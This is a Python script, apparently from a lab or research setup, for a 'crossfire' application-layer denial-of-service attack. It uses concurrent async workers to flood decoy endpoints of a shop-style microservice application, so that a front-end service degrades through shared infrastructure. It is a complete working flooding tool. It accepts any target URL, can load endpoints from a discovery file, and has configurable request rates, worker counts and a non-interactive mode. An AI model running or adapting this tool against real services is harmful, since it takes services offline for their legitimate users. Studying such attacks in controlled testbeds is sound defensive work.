#!/usr/bin/env python3

"""
Crossfire DDoS Attack Simulator - Application Level
This script simulates a crossfire attack at the application layer.

Attack Strategy:
1. Identify target service (victim)
2. Flood decoy services with legitimate-looking requests
3. Cause network link saturation between services
4. Observe target service degradation due to shared infrastructure
"""

import argparse
import asyncio
import aiohttp
import json
import random
import sys
import time
from datetime import datetime
from pathlib import Path
from typing import List, Tuple
from urllib.parse import urlparse

# Decoy endpoints that will be flooded
DECOY_SERVICES = [
    "/catalogue",
    "/catalogue/size",
    "/tags",
    "/cart",
    "/cards",
    "/addresses",
]

# Target service we want to impact indirectly
TARGET_SERVICE = "front-end"

def normalize_endpoint(endpoint: str, base_url: str) -> str:
    """Return either an absolute URL or a path relative to base_url."""
    if not endpoint:
        return ""

    endpoint = endpoint.strip()
    if not endpoint:
        return ""

    if endpoint.startswith("http://") or endpoint.startswith("https://"):
        parsed = urlparse(endpoint)
        base_parsed = urlparse(base_url)
        path = parsed.path or "/"
        if parsed.query:
            path = f"{path}?{parsed.query}"

        if parsed.netloc == base_parsed.netloc:
            return path
        return endpoint

    if not endpoint.startswith("/"):
        return f"/{endpoint}"
    return endpoint


def load_decoy_endpoints(base_url: str, targets_file: str, decoy_limit: int) -> Tuple[List[str], str]:
    """Load decoy endpoints from discovery results when available."""
    decoys = list(DECOY_SERVICES)
    if not targets_file:
        return decoys, base_url

    file_path = Path(targets_file)
    if not file_path.exists():
        print(f"[warn] targets file '{targets_file}' not found. Using default decoys.")
        return decoys, base_url

    try:
        data = json.loads(file_path.read_text())
    except Exception as exc:
        print(f"[warn] failed to parse {targets_file}: {exc}. Using default decoys.")
        return decoys, base_url

    base_url = data.get('base_url', base_url) or base_url

    combined: List[str] = []
    for key in ('api_endpoints', 'discovered_urls', 'static_resources'):
        for entry in data.get(key, []):
            normalized = normalize_endpoint(entry, base_url)
            if normalized and normalized not in combined:
                combined.append(normalized)

    if not combined:
        print(f"[warn] no endpoints found in {targets_file}. Using default decoys.")
        return decoys, base_url

    random.shuffle(combined)
    decoys = combined

    if decoy_limit > 0:
        decoys = decoys[:decoy_limit]

    return decoys, base_url


class CrossfireAttack:
    def __init__(self, base_url: str, decoy_endpoints: List[str], duration: int, rate: int, workers: int, non_interactive: bool = False):
        self.base_url = base_url.rstrip('/')
        self.decoy_endpoints = decoy_endpoints
        self.duration = duration
        self.rate = rate  # requests per second per worker
        self.workers = workers
        self.non_interactive = non_interactive
        self.stats = {
            'total_requests': 0,
            'successful': 0,
            'failed': 0,
            'errors': {},
            'start_time': None,
            'end_time': None,
            'per_service': {}  # Track per-service metrics for crossfire validation
        }

    async def send_request(self, session: aiohttp.ClientSession, endpoint: str):
        """Send a single request to a decoy service"""
        if endpoint.startswith("http://") or endpoint.startswith("https://"):
            url = endpoint
        else:
            url = f"{self.base_url}{endpoint}"
        
        # Track per-service metrics
        service_key = endpoint.split('?')[0]  # Remove query params
        if service_key not in self.stats['per_service']:
            self.stats['per_service'][service_key] = {
                'requests': 0,
                'successful': 0,
                'failed': 0,
                'errors': {}
            }
        
        try:
            # Shorter timeout for more aggressive attack
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=2)) as response:
                self.stats['total_requests'] += 1
                self.stats['per_service'][service_key]['requests'] += 1
                
                if response.status == 200:
                    self.stats['successful'] += 1
                    self.stats['per_service'][service_key]['successful'] += 1
                    # Read response to consume resources
                    await response.read()
                else:
                    self.stats['failed'] += 1
                    self.stats['per_service'][service_key]['failed'] += 1
                return response.status
        except Exception as e:
            self.stats['failed'] += 1
            self.stats['per_service'][service_key]['failed'] += 1
            
            error_type = type(e).__name__
            self.stats['errors'][error_type] = self.stats['errors'].get(error_type, 0) + 1
            self.stats['per_service'][service_key]['errors'][error_type] = \
                self.stats['per_service'][service_key]['errors'].get(error_type, 0) + 1
            return None

    async def worker(self, worker_id: int):
        """Worker coroutine that sends requests at specified rate"""
        print(f"[Worker {worker_id}] Started")
        
        # Configure connector for more aggressive connections
        connector = aiohttp.TCPConnector(
            limit=100,  # More concurrent connections
            limit_per_host=50,
            ttl_dns_cache=300
        )
        
        async with aiohttp.ClientSession(connector=connector) as session:
            end_time = time.time() + self.duration
            request_interval = 1.0 / self.rate  # seconds between requests
            
            while time.time() < end_time:
                # Send burst of requests to random decoy services
                tasks = []
                burst_size = min(5, self.rate)  # Burst of 5 requests or rate, whichever is smaller
                
                for _ in range(burst_size):
                    endpoint = random.choice(self.decoy_endpoints)
                    tasks.append(self.send_request(session, endpoint))
                
                # Execute burst concurrently
                await asyncio.gather(*tasks, return_exceptions=True)
                
                # Wait before next burst
                await asyncio.sleep(request_interval * burst_size)
        
        print(f"[Worker {worker_id}] Finished")

    async def run(self):
        """Execute the crossfire attack"""
        print(f"\n{'='*60}")
        print(f"Crossfire DDoS Attack - Application Level")
        print(f"{'='*60}")
        print(f"Target: {TARGET_SERVICE} (indirect)")
        print(f"Base URL: {self.base_url}")
        print(f"Duration: {self.duration}s")
        print(f"Rate: {self.rate} req/s per worker")
        print(f"Workers: {self.workers}")
        print(f"Total Rate: {self.rate * self.workers} req/s")
        print(f"Decoy Services: {len(self.decoy_endpoints)}")
        print(f"{'='*60}\n")
        
        if not self.non_interactive:
            input("Press Enter to start the attack (ensure monitoring is ready)...")
        else:
            print("Starting attack...\n")
        
        self.stats['start_time'] = datetime.now()
        start = time.time()
        
        # Launch all workers
        workers = [self.worker(i) for i in range(self.workers)]
        await asyncio.gather(*workers)
        
        self.stats['end_time'] = datetime.now()
        elapsed = time.time() - start
        
        # Print statistics
        print(f"\n{'='*60}")
        print(f"Attack Complete")
        print(f"{'='*60}")
        print(f"Duration: {elapsed:.2f}s")
        print(f"Total Requests: {self.stats['total_requests']}")
        print(f"Successful: {self.stats['successful']}")
        print(f"Failed: {self.stats['failed']}")
        
        if self.stats['total_requests'] > 0:
            print(f"Success Rate: {(self.stats['successful']/self.stats['total_requests']*100):.2f}%")
            print(f"Actual Rate: {self.stats['total_requests']/elapsed:.2f} req/s")
        else:
            print(f"Success Rate: 0.00%")
            print(f"Actual Rate: 0.00 req/s")
            print(f"\n⚠️  WARNING: No requests were made. Check if target is accessible.")
        
        if self.stats['errors']:
            print(f"\nErrors:")
            for error_type, count in self.stats['errors'].items():
                print(f"  {error_type}: {count}")
        
        # Print per-service breakdown (crossfire validation)
        if self.stats['per_service']:
            print(f"\n{'='*60}")
            print(f"CROSSFIRE ATTACK VALIDATION")
            print(f"{'='*60}")
            print(f"Per-Service Breakdown (Decoy Traffic Distribution):")
            print(f"")
            
            sorted_services = sorted(
                self.stats['per_service'].items(),
                key=lambda x: x[1]['requests'],
                reverse=True
            )
            
            for service, metrics in sorted_services:
                success_rate = (metrics['successful'] / metrics['requests'] * 100) if metrics['requests'] > 0 else 0
                request_pct = (metrics['requests']/self.stats['total_requests']*100) if self.stats['total_requests'] > 0 else 0
                print(f"  {service}")
                print(f"    Requests: {metrics['requests']} ({request_pct:.1f}%)")
                print(f"    Success: {metrics['successful']} ({success_rate:.1f}%)")
                print(f"    Failed: {metrics['failed']}")
            
            print(f"\n✓ Crossfire Characteristics:")
            print(f"  - High volume traffic to DECOY services (shown above)")
            print(f"  - Decoy services experience load and potential degradation")
            print(f"  - Target service (front-end) impacted INDIRECTLY via:")
            print(f"    * Network link saturation")
            print(f"    * Shared infrastructure resource exhaustion")
            print(f"    * Backend service contention")
            print(f"\nTo validate crossfire impact, compare target service performance")
            print(f"BEFORE and DURING attack using: python3 crossfire-detector.py")
        
        print(f"{'='*60}\n")

def main():
    parser = argparse.ArgumentParser(
        description='Crossfire DDoS Attack Simulator (Application Level)',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument(
        '--url',
        default='http://localhost:8080',
        help='Base URL fallback when --target not supplied'
    )
    parser.add_argument(
        '--target',
        help='Primary target base URL (overrides --url)'
    )
    parser.add_argument(
        '--targets-file',
        help='Path to discovery JSON for candidate decoy endpoints'
    )
    parser.add_argument(
        '--duration',
        type=int,
        default=60,
        help='Attack duration in seconds'
    )
    parser.add_argument(
        '--rate',
        type=int,
        default=10,
        help='Requests per second per worker (fallback when --flood-rate not set)'
    )
    parser.add_argument(
        '--workers',
        type=int,
        default=10,
        help='Number of concurrent workers (fallback when --bot-threads not set)'
    )
    parser.add_argument(
        '--flood-rate',
        type=int,
        dest='flood_rate',
        help='Alias for --rate'
    )
    parser.add_argument(
        '--bot-threads',
        type=int,
        dest='bot_threads',
        help='Alias for --workers'
    )
    parser.add_argument(
        '--decoys',
        type=int,
        default=0,
        help='Maximum number of decoy endpoints to cycle through (0 = use all)'
    )
    parser.add_argument(
        '--non-interactive',
        action='store_true',
        help='Run without user prompts'
    )
    
    args = parser.parse_args()
    
    # Validate inputs
    rate = args.flood_rate if args.flood_rate else args.rate
    workers = args.bot_threads if args.bot_threads else args.workers

    if args.duration <= 0 or rate <= 0 or workers <= 0:
        print("Error: duration, rate, and workers must be positive integers")
        sys.exit(1)

    base_url = args.target or args.url
    decoy_endpoints, base_url = load_decoy_endpoints(base_url, args.targets_file, args.decoys)

    # Run attack
    attack = CrossfireAttack(base_url, decoy_endpoints, args.duration, rate, workers, args.non_interactive)
    
    try:
        asyncio.run(attack.run())
    except KeyboardInterrupt:
        print("\n\nAttack interrupted by user")
        sys.exit(0)

if __name__ == '__main__':
    main()
